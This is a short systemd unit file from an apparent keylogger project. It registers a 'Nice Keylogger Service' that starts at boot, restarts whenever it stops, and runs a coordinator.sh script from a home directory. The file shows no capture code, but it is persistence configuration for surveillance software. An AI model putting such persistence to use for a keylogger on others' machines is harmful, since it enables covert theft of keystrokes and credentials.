# src/nicekeylogger.service
[Unit]
Description=Nice Keylogger Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
# TODO confirm this directory works
ExecStart=~/nicekl/coordinator.sh

[Install]
WantedBy=multi-user.target